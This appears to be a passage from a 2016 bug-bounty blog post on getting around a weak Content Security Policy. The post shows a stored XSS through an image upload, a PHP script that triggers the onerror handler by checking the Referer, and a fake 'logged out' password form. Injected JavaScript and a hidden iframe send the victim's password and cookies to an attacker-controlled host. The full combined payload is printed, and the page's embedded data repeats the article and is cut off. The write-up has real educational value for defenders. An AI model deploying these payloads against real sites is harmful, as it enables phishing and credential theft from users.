<pre><code class="hljs language-html"><span class="hljs-tag">&#x3C;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://hackerdomain.hax/img.php"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"this.src=alert(1)"</span>/></span>
</code></pre>
<p>This works because the CSP allows images to be loaded from anywhere. You may wonder why the JS is only triggered <code>onerror</code> and why the domain it set to <code>/img.php</code>.</p>
<p>Once the victim has dropped the image into their gallery, the website will contact the hacker's domain to get a thumbnail image. The <code>img.php</code> script will detect the if the <code>HTTP_REFERER</code> is set to <em>company.com</em> which in that case will return a <em>404</em> causing the <code>onerror</code> attribute to execute.</p>
<h5>img.php</h5>
<pre><code class="hljs language-php">
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_REFERER'</span>])) {
    <span class="hljs-variable">$ref</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_REFERER'</span>];
} <span class="hljs-keyword">else</span> {
    <span class="hljs-variable">$ref</span> = <span class="hljs-string">"nope"</span>;
}

<span class="hljs-variable">$pattern</span> = <span class="hljs-string">'/.+company.com.+/'</span>;
preg_match(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$ref</span>, <span class="hljs-variable">$matches</span>);

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$matches</span>) {
    <span class="hljs-keyword">return</span> header(<span class="hljs-string">"HTTP/1.0 404 Not Found"</span>);
    <span class="hljs-keyword">die</span>();
} <span class="hljs-keyword">else</span> {
    <span class="hljs-variable">$name</span> = <span class="hljs-string">'hunter2.jpg'</span>;
    <span class="hljs-variable">$fp</span> = fopen(<span class="hljs-variable">$name</span>, <span class="hljs-string">'rb'</span>);

    header(<span class="hljs-string">"Content-Type: image/jpeg"</span>);
    header(<span class="hljs-string">"Content-Length: "</span> . filesize(<span class="hljs-variable">$name</span>));

    fpassthru(<span class="hljs-variable">$fp</span>);
}

</code></pre>
<p>Now we can successfully run javascript in the victim's DOM, <em>what next?</em> My next step was to steal the user's cookies but the session cookie was set to <code>HttpOnly</code> which instructs the browser to not allow javascript to access the cookie. <strong>Bummer!</strong></p>
<p>My next thought was to change the user's email address to my email and then preform a <em>Forgot password</em> which will send the password reset link to my email. However I noticed that once the email has been changed, the user will get a notification and the ability to lock the account. This could still be a viable attack vector depending on how long the user can wait until their ability to lock their account expires.</p>
<h3>Lets go phishing</h3>
<p>Instead I chose to try to trick the user into enter their account password because they had been logged out. To accomplish this I needed to build a HTML Form, hide all other HTML elements and be able to send the data to my server.</p>
<p>The communication part was the tricky part because the CSP only allows <code>XMLHttpRequest</code> to be used for specific domains. However after a bit of researching I found that I can communicate via iframes and to my luck iframes could be loaded from anywhere according to the CSP. Tunneling data via iframes can be visualised as followed:

<img src="../images/iframe_postmessage.png" alt="">

The injected iframe looks like the following:</p>
<pre><code class="hljs language-html"><span class="hljs-tag">&#x3C;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://hackerdomain.com/recv.html"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"siteb"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"myframe"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none"</span>></span><span class="hljs-tag">&#x3C;/<span class="hljs-name">iframe</span>></span>
</code></pre>
<p>Once the user enters their password and clicks submit, the following script will send the data to the iframe.</p>
<pre><code class="hljs language-javascript">&#x3C;script type=<span class="hljs-string">"text/javascript"</span>>
    form.onsubmit = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{

        pw=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'mypw'</span>).value;
        c=<span class="hljs-built_in">document</span>.cookie;
        data={<span class="hljs-string">'cookie'</span>:c,<span class="hljs-string">'pw'</span>:pw};
        fi=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'myframe'</span>);
        fi.postMessage(<span class="hljs-built_in">JSON</span>.stringify(data),<span class="hljs-string">'*'</span>);

    }
&#x3C;/script>
</code></pre>
<p>Below you can find the code which receives the data.</p>
<h5>hackerdomain.com/recv.html</h5>
<pre><code class="hljs language-html"><span class="hljs-tag">&#x3C;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"message"</span>></span><span class="hljs-tag">&#x3C;/<span class="hljs-name">div</span>></span>
<span class="hljs-tag">&#x3C;<span class="hljs-name">script</span>></span><span class="javascript">
<span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">'message'</span>, writeMessage, <span class="hljs-literal">false</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeMessage</span>(<span class="hljs-params">event</span>) </span>{
    <span class="hljs-keyword">var</span> xmlHttp = <span class="hljs-keyword">new</span> XMLHttpRequest();
    data = <span class="hljs-built_in">JSON</span>.parse(event.data);
    xmlHttp.open( <span class="hljs-string">"GET"</span>, <span class="hljs-string">"https://hackerdomain/stl.php?c="</span>+data.cookie+<span class="hljs-string">"&#x26;pw="</span>+data.pw, <span class="hljs-literal">false</span> ); <span class="hljs-comment">// false for synchronous request</span>
    xmlHttp.send();
    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"message"</span>).innerHTML = event.data;
}
</span><span class="hljs-tag">&#x3C;/<span class="hljs-name">script</span>></span>
</code></pre>
<p>Once the data has been sent to my domain, from there I can send it to my cookie stealer script and save the data. The final payload can be viewed below:</p>
<h5>Final Payload</h5>
<pre><code class="hljs language-html"><span class="hljs-tag">&#x3C;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://hackerdomain/img.php"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"this.src=a=document.getElementsByTagName('head')[0];f=document.createElement('iframe');f.src='https://hackerdomain.com/recv.html';f.name='siteb';f.id='myframe';f.setAttribute('style','display:none');b=document.createElement('script');div=document.createElement('div');div.style='width:660;height:90%;font:16px Arial;padding:3em;text-align:center;margin:auto;';form=document.createElement('form');form.action='#';inp=document.createElement('input');inp.type='password';inp.id='mypw';sub=document.createElement('input');sub.type='submit';sub.id='subid';form.appendChild(inp);form.appendChild(sub);s='*';t='You have been logged out. Please login below to access your account.';b.type='text/javascript';document.body.appendChild(f);fi=document.getElementById('myframe').contentWindow;b.appendChild(document.createTextNode('form.onsubmit = function() {pw=document.getElementById(\'mypw\').value;c=document.cookie;data={\'cookie\':c,\'pw\':pw};fi.postMessage(JSON.stringify(data),\'*\');}'));le=document.getElementsByClassName('left pane')[0];le.setAttribute('style','display:none');ri=document.getElementsByClassName('right pane')[0];ri.setAttribute('style','display:none');c=document.getElementsByClassName('cancelButton')[0];c.setAttribute('style','display:none');a.appendChild(b);m=document.getElementsByClassName('create modelimg')[0];m.style='overflow:hidden;';m.appendChild(div);div.innerHTML=t;div.appendChild(form);"</span>/></span>
</code></pre>
<h2>Conclusion</h2>
<p>While CSP is a great tool to limit the attack surface for potential attackers, it must be configured properly otherwise you might as well not use it. As shown in this article, the website I was looking for bugs on did use CSP however because of three policy directives which allowed inline javascript, iframes and images to be loaded from anywhere I could successfully mount an attack against any user of the site. This shows how important it is to be aware of the security models you deploy as a developer.</p>
<h4>References</h4>
<ul>
<li><a href="http://www.html5rocks.com/en/tutorials/security/content-security-policy/">http://www.html5rocks.com/en/tutorials/security/content-security-policy/</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage">https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage</a></li>
<li><a href="https://speakerdeck.com/mikispag/making-csp-great-again-michele-spagnuolo-and-lukas-weichselbaum">https://speakerdeck.com/mikispag/making-csp-great-again-michele-spagnuolo-and-lukas-weichselbaum</a></li>
</ul><!-- HTML_TAG_END --></article></main>

<footer><div class="row"><div class="col center"><p><a href="https://twitter.com/dubs3c">Twitter</a> | <a href="https://github.com/dubs3c">Github</a> | <a href="https://ko-fi.com/dubs3c">Ko-fi</a></p></div></div></footer>



	<script type="application/json" data-type="svelte-data" data-url="/2016-07-21-exploiting-weak-content-security-policy-csp-rules-for-fun-and-profit.json">{"status":200,"statusText":"","headers":{"content-type":"text/plain;charset=UTF-8"},"body":"{\"metadata\":{\"date\":\"Jul 21, 2016\",\"title\":\"Exploiting weak Content Security Policy (CSP) rules for fun and profit\",\"template\":\"post\",\"slug\":\"exploiting-weak-content-security-policy-csp-rules-for-fun-and-profit\",\"categories\":[\"Bug Bounty\",\"Web Application Security\"],\"tags\":[\"Bug Bounty\",\"Web Application Security\"]},\"content\":\"\u003Cp\u003EThis article is based on my findings during a bug bounty. I was looking for any input bugs which could trigger a XSS but didn't find any until I tested the file upload functionality. Users had the option to drag&#x26;drop images into the company's website and place it in their gallery, however by specifying an image like this:\u003C\u002Fp\u003E\\n\u003Cpre\u003E\u003Ccode class=\\\"hljs language-html\\\"\u003E\u003Cspan class=\\\"hljs-tag\\\"\u003E&#x3C;\u003Cspan class=\\\"hljs-name\\\"\u003Eimg\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-attr\\\"\u003Esrc\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"https:\u002F\u002Fhackerdomain.hax\u002Fimg.php\\\"\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-attr\\\"\u003Eonerror\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"this.src=alert(1)\\\"\u003C\u002Fspan\u003E\u002F\u003E\u003C\u002Fspan\u003E\\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\\n\u003Cp\u003EAnd dropping it into the website trigged an XSS.\u003C\u002Fp\u003E\\n\u003Cp\u003EBefore I continue my report I will first cover what CSP is and what it tries to accomplish. If you feel you are already experienced in the area you can skip to the next section.\u003C\u002Fp\u003E\\n\u003Ch2\u003EWhat is CSP?\u003C\u002Fh2\u003E\\n\u003Cp\u003EContent Security Policy (CSP) is a client-side security model which allows developers to specify where different types of resources should be loaded, executed and embedded from. With CSP you can instruct the browser only to load javascript resources from a specific domain as well as block inline javascript running on the website. This is very helpful against XSS since most attacks requires inline javascript. There also the possibility to specify a \u003Ccode\u003Ereport-uri\u003C\u002Fcode\u003E which the browser uses to send detected policy violations \u003Cem\u003E(of course this can be spoofed)\u003C\u002Fem\u003E.\u003C\u002Fp\u003E\\n\u003Cp\u003EHowever CSP is only effective if used fully, i.e blocking inline javascript and loading resources from trusted domains. This requirement can be too strict for some websites, that's why there are certain work arounds such as using nonces that whitelists specific \u003Ccode\u003E&#x3C;script\u003E&#x3C;\u002Fscript\u003E\u003C\u002Fcode\u003E tags.\u003C\u002Fp\u003E\\n\u003Cp\u003EIt should be noted that even using \u003Cem\u003Etrusted\u003C\u002Fem\u003E sources wont always protect you. If JSONP is enabled or e.g. angularjs is hosted on the whitelisted source, it is possible to bypass CSP with the following:\u003C\u002Fp\u003E\\n\u003Ch6\u003EJSONP\u003C\u002Fh6\u003E\\n\u003Cpre\u003E\u003Ccode class=\\\"hljs language-xml\\\"\u003E\u003Cspan class=\\\"hljs-tag\\\"\u003E&#x3C;\u003Cspan class=\\\"hljs-name\\\"\u003Escript\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-attr\\\"\u003Esrc\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"https:\u002F\u002Fwhitelisted.com\u002Fjsonp?callback=alert\\\"\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\\n\u003Ch6\u003EAngularJS\u003C\u002Fh6\u003E\\n\u003Cpre\u003E\u003Ccode class=\\\"hljs language-routeros\\\"\u003E&#x3C;script \u003Cspan class=\\\"hljs-attribute\\\"\u003Esrc\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"https:\u002F\u002Fwhitelisted.com\u002Fangularjs\u002F1.1.3\u002Fangularjs.min.js\\\"\u003C\u002Fspan\u003E\u003E\\n&#x3C;div ng-app ng-csp \u003Cspan class=\\\"hljs-attribute\\\"\u003Eid\u003C\u002Fspan\u003E=p \u003Cspan class=\\\"hljs-attribute\\\"\u003Eng-click\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-variable\\\"\u003E$event\u003C\u002Fspan\u003E.view.alert(1)\u003E\\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\\n\u003Ch2\u003EWeaknesses\u003C\u002Fh2\u003E\\n\u003Cp\u003EAs I mentioned earlier the company had employed CSP which is a good step in the right direction but because of its weak rules I could bypass it entirely and run whatever javascript I wanted once triggered.\u003C\u002Fp\u003E\\n\u003Cp\u003EBelow you can see a copy of the CSP:\u003C\u002Fp\u003E\\n\u003Cpre\u003E\u003Ccode class=\\\"hljs language-vim\\\"\u003Edefault-src \u003Cspan class=\\\"hljs-string\\\"\u003E'self'\u003C\u002Fspan\u003E http\u003Cspan class=\\\"hljs-variable\\\"\u003Es:\u003C\u002Fspan\u003E\u002F\u002F*.company.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E http\u003Cspan class=\\\"hljs-variable\\\"\u003Es:\u003C\u002Fspan\u003E\u002F\u002F*.companyimg.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E  *.company.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E *.companyimg.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E *.google.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E connect.facebook.net *.google-analytics.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E http\u003Cspan class=\\\"hljs-variable\\\"\u003Es:\u003C\u002Fspan\u003E\u002F\u002F*.googleapis.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E *.gstatic.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E http\u003Cspan class=\\\"hljs-variable\\\"\u003Es:\u003C\u002Fspan\u003E\u002F\u002F*.facebook.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E *.facebook.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E www.googleadservices.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E googleads.g.doubleclick.net platform.twitter.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E *.tiles.mapbox.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E *.online-metrix.net *.bnc.\u003Cspan class=\\\"hljs-keyword\\\"\u003Elt\u003C\u002Fspan\u003E bnc.\u003Cspan class=\\\"hljs-keyword\\\"\u003Elt\u003C\u002Fspan\u003E *.yozio.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-string\\\"\u003E'unsafe-inline'\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-string\\\"\u003E'unsafe-eval'\u003C\u002Fspan\u003E;\\n\\nmedia-src \u003Cspan class=\\\"hljs-string\\\"\u003E'self'\u003C\u002Fspan\u003E *.companyimg.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E blo\u003Cspan class=\\\"hljs-variable\\\"\u003Eb:\u003C\u002Fspan\u003E;\\n\\nframe-src *;\\n\\nconnect-src \u003Cspan class=\\\"hljs-string\\\"\u003E'self'\u003C\u002Fspan\u003E *.mapbox.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E *.company.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E company.s3.amazonaws.\u003Cspan class=\\\"hljs-keyword\\\"\u003Ecom\u003C\u002Fspan\u003E ;\\n\\nimg-src * dat\u003Cspan class=\\\"hljs-variable\\\"\u003Ea:\u003C\u002Fspan\u003E;\\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\\n\u003Cp\u003EThe \u003Ccode\u003Edefault-src\u003C\u002Fcode\u003E directive is set to only load resources from \u003Cem\u003Eself\u003C\u002Fem\u003E and the other domains listed unless specified otherwise by other directives. If you haven't noticed it \u003Ccode\u003Eunsafe-inline\u003C\u002Fcode\u003E and \u003Ccode\u003Eunsafe-eval\u003C\u002Fcode\u003E is also present, which means running inline javascript is allowed \u003Cstrong\u003Eby default\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\\n\u003Cp\u003EOther directives that are of interest is the \u003Ccode\u003Eframe-src\u003C\u002Fcode\u003E and \u003Ccode\u003Eimg-src\u003C\u002Fcode\u003E because they allow resources to be loaded from anywhere. By exploiting \u003Ccode\u003Eunsafe-inline\u003C\u002Fcode\u003E and \u003Ccode\u003Eunsafe-eval\u003C\u002Fcode\u003E for running inline javascript, \u003Ccode\u003Eframe-src\u003C\u002Fcode\u003E for sending data to the attacker's domain and \u003Ccode\u003Eimg-src\u003C\u002Fcode\u003E to trigger the initial XSS we can deliver a powerful payload.\u003C\u002Fp\u003E\\n\u003Ch2\u003EThe attack\u003C\u002Fh2\u003E\\n\u003Cp\u003EFirst we construct the image which the victim will drag&#x26;drop into their gallery:\u003C\u002Fp\u003E\\n\u003Cpre\u003E\u003Ccode class=\\\"hljs language-html\\\"\u003E\u003Cspan class=\\\"hljs-tag\\\"\u003E&#x3C;\u003Cspan class=\\\"hljs-name\\\"\u003Eimg\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-attr\\\"\u003Esrc\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"https:\u002F\u002Fhackerdomain.hax\u002Fimg.php\\\"\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-attr\\\"\u003Eonerror\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"this.src=alert(1)\\\"\u003C\u002Fspan\u003E\u002F\u003E\u003C\u002Fspan\u003E\\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\\n\u003Cp\u003EThis works because the CSP allows images to be loaded from anywhere. You may wonder why the JS is only triggered \u003Ccode\u003Eonerror\u003C\u002Fcode\u003E and why the domain it set to \u003Ccode\u003E\u002Fimg.php\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\\n\u003Cp\u003EOnce the victim has dropped the image into their gallery, the website will contact the hacker's domain to get a thumbnail image. The \u003Ccode\u003Eimg.php\u003C\u002Fcode\u003E script will detect the if the \u003Ccode\u003EHTTP_REFERER\u003C\u002Fcode\u003E is set to \u003Cem\u003Ecompany.com\u003C\u002Fem\u003E which in that case will return a \u003Cem\u003E404\u003C\u002Fem\u003E causing the \u003Ccode\u003Eonerror\u003C\u002Fcode\u003E attribute to execute.\u003C\u002Fp\u003E\\n\u003Ch5\u003Eimg.php\u003C\u002Fh5\u003E\\n\u003Cpre\u003E\u003Ccode class=\\\"hljs language-php\\\"\u003E\\n\u003Cspan class=\\\"hljs-keyword\\\"\u003Eif\u003C\u002Fspan\u003E(\u003Cspan class=\\\"hljs-keyword\\\"\u003Eisset\u003C\u002Fspan\u003E(\u003Cspan class=\\\"hljs-variable\\\"\u003E$_SERVER\u003C\u002Fspan\u003E[\u003Cspan class=\\\"hljs-string\\\"\u003E'HTTP_REFERER'\u003C\u002Fspan\u003E])) {\\n    \u003Cspan class=\\\"hljs-variable\\\"\u003E$ref\u003C\u002Fspan\u003E = \u003Cspan class=\\\"hljs-variable\\\"\u003E$_SERVER\u003C\u002Fspan\u003E[\u003Cspan class=\\\"hljs-string\\\"\u003E'HTTP_REFERER'\u003C\u002Fspan\u003E];\\n} \u003Cspan class=\\\"hljs-keyword\\\"\u003Eelse\u003C\u002Fspan\u003E {\\n    \u003Cspan class=\\\"hljs-variable\\\"\u003E$ref\u003C\u002Fspan\u003E = \u003Cspan class=\\\"hljs-string\\\"\u003E\\\"nope\\\"\u003C\u002Fspan\u003E;\\n}\\n\\n\u003Cspan class=\\\"hljs-variable\\\"\u003E$pattern\u003C\u002Fspan\u003E = \u003Cspan class=\\\"hljs-string\\\"\u003E'\u002F.+company.com.+\u002F'\u003C\u002Fspan\u003E;\\npreg_match(\u003Cspan class=\\\"hljs-variable\\\"\u003E$pattern\u003C\u002Fspan\u003E, \u003Cspan class=\\\"hljs-variable\\\"\u003E$ref\u003C\u002Fspan\u003E, \u003Cspan class=\\\"hljs-variable\\\"\u003E$matches\u003C\u002Fspan\u003E);\\n\\n\u003Cspan class=\\\"hljs-keyword\\\"\u003Eif\u003C\u002Fspan\u003E(\u003Cspan class=\\\"hljs-variable\\\"\u003E$matches\u003C\u002Fspan\u003E) {\\n    \u003Cspan class=\\\"hljs-keyword\\\"\u003Ereturn\u003C\u002Fspan\u003E header(\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"HTTP\u002F1.0 404 Not Found\\\"\u003C\u002Fspan\u003E);\\n    \u003Cspan class=\\\"hljs-keyword\\\"\u003Edie\u003C\u002Fspan\u003E();\\n} \u003Cspan class=\\\"hljs-keyword\\\"\u003Eelse\u003C\u002Fspan\u003E {\\n    \u003Cspan class=\\\"hljs-variable\\\"\u003E$name\u003C\u002Fspan\u003E = \u003Cspan class=\\\"hljs-string\\\"\u003E'hunter2.jpg'\u003C\u002Fspan\u003E;\\n    \u003Cspan class=\\\"hljs-variable\\\"\u003E$fp\u003C\u002Fspan\u003E = fopen(\u003Cspan class=\\\"hljs-variable\\\"\u003E$name\u003C\u002Fspan\u003E, \u003Cspan class=\\\"hljs-string\\\"\u003E'rb'\u003C\u002Fspan\u003E);\\n\\n    header(\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"Content-Type: image\u002Fjpeg\\\"\u003C\u002Fspan\u003E);\\n    header(\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"Content-Length: \\\"\u003C\u002Fspan\u003E . filesize(\u003Cspan class=\\\"hljs-variable\\\"\u003E$name\u003C\u002Fspan\u003E));\\n\\n    fpassthru(\u003Cspan class=\\\"hljs-variable\\\"\u003E$fp\u003C\u002Fspan\u003E);\\n}\\n\\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\\n\u003Cp\u003ENow we can successfully run javascript in the victim's DOM, \u003Cem\u003Ewhat next?\u003C\u002Fem\u003E My next step was to steal the user's cookies but the session cookie was set to \u003Ccode\u003EHttpOnly\u003C\u002Fcode\u003E which instructs the browser to not allow javascript to access the cookie. \u003Cstrong\u003EBummer!\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\\n\u003Cp\u003EMy next thought was to change the user's email address to my email and then preform a \u003Cem\u003EForgot password\u003C\u002Fem\u003E which will send the password reset link to my email. However I noticed that once the email has been changed, the user will get a notification and the ability to lock the account. This could still be a viable attack vector depending on how long the user can wait until their ability to lock their account expires.\u003C\u002Fp\u003E\\n\u003Ch3\u003ELets go phishing\u003C\u002Fh3\u003E\\n\u003Cp\u003EInstead I chose to try to trick the user into enter their account password because they had been logged out. To accomplish this I needed to build a HTML Form, hide all other HTML elements and be able to send the data to my server.\u003C\u002Fp\u003E\\n\u003Cp\u003EThe communication part was the tricky part because the CSP only allows \u003Ccode\u003EXMLHttpRequest\u003C\u002Fcode\u003E to be used for specific domains. However after a bit of researching I found that I can communicate via iframes and to my luck iframes could be loaded from anywhere according to the CSP. Tunneling data via iframes can be visualised as followed:\\n\\n\u003Cimg src=\\\"..\u002Fimages\u002Fiframe_postmessage.png\\\" alt=\\\"\\\"\u003E\\n\\nThe injected iframe looks like the following:\u003C\u002Fp\u003E\\n\u003Cpre\u003E\u003Ccode class=\\\"hljs language-html\\\"\u003E\u003Cspan class=\\\"hljs-tag\\\"\u003E&#x3C;\u003Cspan class=\\\"hljs-name\\\"\u003Eiframe\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-attr\\\"\u003Esrc\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"https:\u002F\u002Fhackerdomain.com\u002Frecv.html\\\"\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-attr\\\"\u003Ename\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"siteb\\\"\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-attr\\\"\u003Eid\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"myframe\\\"\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-attr\\\"\u003Estyle\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"display:none\\\"\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\u003Cspan class=\\\"hljs-tag\\\"\u003E&#x3C;\u002F\u003Cspan class=\\\"hljs-name\\\"\u003Eiframe\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\\n\u003Cp\u003EOnce the user enters their password and clicks submit, the following script will send the data to the iframe.\u003C\u002Fp\u003E\\n\u003Cpre\u003E\u003Ccode class=\\\"hljs language-javascript\\\"\u003E&#x3C;script type=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"text\u002Fjavascript\\\"\u003C\u002Fspan\u003E\u003E\\n    form.onsubmit = \u003Cspan class=\\\"hljs-function\\\"\u003E\u003Cspan class=\\\"hljs-keyword\\\"\u003Efunction\u003C\u002Fspan\u003E(\u003Cspan class=\\\"hljs-params\\\"\u003E\u003C\u002Fspan\u003E) \u003C\u002Fspan\u003E{\\n\\n        pw=\u003Cspan class=\\\"hljs-built_in\\\"\u003Edocument\u003C\u002Fspan\u003E.getElementById(\u003Cspan class=\\\"hljs-string\\\"\u003E'mypw'\u003C\u002Fspan\u003E).value;\\n        c=\u003Cspan class=\\\"hljs-built_in\\\"\u003Edocument\u003C\u002Fspan\u003E.cookie;\\n        data={\u003Cspan class=\\\"hljs-string\\\"\u003E'cookie'\u003C\u002Fspan\u003E:c,\u003Cspan class=\\\"hljs-string\\\"\u003E'pw'\u003C\u002Fspan\u003E:pw};\\n        fi=\u003Cspan class=\\\"hljs-built_in\\\"\u003Edocument\u003C\u002Fspan\u003E.getElementById(\u003Cspan class=\\\"hljs-string\\\"\u003E'myframe'\u003C\u002Fspan\u003E);\\n        fi.postMessage(\u003Cspan class=\\\"hljs-built_in\\\"\u003EJSON\u003C\u002Fspan\u003E.stringify(data),\u003Cspan class=\\\"hljs-string\\\"\u003E'*'\u003C\u002Fspan\u003E);\\n\\n    }\\n&#x3C;\u002Fscript\u003E\\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\\n\u003Cp\u003EBelow you can find the code which receives the data.\u003C\u002Fp\u003E\\n\u003Ch5\u003Ehackerdomain.com\u002Frecv.html\u003C\u002Fh5\u003E\\n\u003Cpre\u003E\u003Ccode class=\\\"hljs language-html\\\"\u003E\u003Cspan class=\\\"hljs-tag\\\"\u003E&#x3C;\u003Cspan class=\\\"hljs-name\\\"\u003Ediv\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-attr\\\"\u003Eid\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"message\\\"\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\u003Cspan class=\\\"hljs-tag\\\"\u003E&#x3C;\u002F\u003Cspan class=\\\"hljs-name\\\"\u003Ediv\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\\n\u003Cspan class=\\\"hljs-tag\\\"\u003E&#x3C;\u003Cspan class=\\\"hljs-name\\\"\u003Escript\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\u003Cspan class=\\\"javascript\\\"\u003E\\n\u003Cspan class=\\\"hljs-built_in\\\"\u003Ewindow\u003C\u002Fspan\u003E.addEventListener(\u003Cspan class=\\\"hljs-string\\\"\u003E'message'\u003C\u002Fspan\u003E, writeMessage, \u003Cspan class=\\\"hljs-literal\\\"\u003Efalse\u003C\u002Fspan\u003E);\\n\u003Cspan class=\\\"hljs-function\\\"\u003E\u003Cspan class=\\\"hljs-keyword\\\"\u003Efunction\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-title\\\"\u003EwriteMessage\u003C\u002Fspan\u003E(\u003Cspan class=\\\"hljs-params\\\"\u003Eevent\u003C\u002Fspan\u003E) \u003C\u002Fspan\u003E{\\n    \u003Cspan class=\\\"hljs-keyword\\\"\u003Evar\u003C\u002Fspan\u003E xmlHttp = \u003Cspan class=\\\"hljs-keyword\\\"\u003Enew\u003C\u002Fspan\u003E XMLHttpRequest();\\n    data = \u003Cspan class=\\\"hljs-built_in\\\"\u003EJSON\u003C\u002Fspan\u003E.parse(event.data);\\n    xmlHttp.open( \u003Cspan class=\\\"hljs-string\\\"\u003E\\\"GET\\\"\u003C\u002Fspan\u003E, \u003Cspan class=\\\"hljs-string\\\"\u003E\\\"https:\u002F\u002Fhackerdomain\u002Fstl.php?c=\\\"\u003C\u002Fspan\u003E+data.cookie+\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"&#x26;pw=\\\"\u003C\u002Fspan\u003E+data.pw, \u003Cspan class=\\\"hljs-literal\\\"\u003Efalse\u003C\u002Fspan\u003E ); \u003Cspan class=\\\"hljs-comment\\\"\u003E\u002F\u002F false for synchronous request\u003C\u002Fspan\u003E\\n    xmlHttp.send();\\n    \u003Cspan 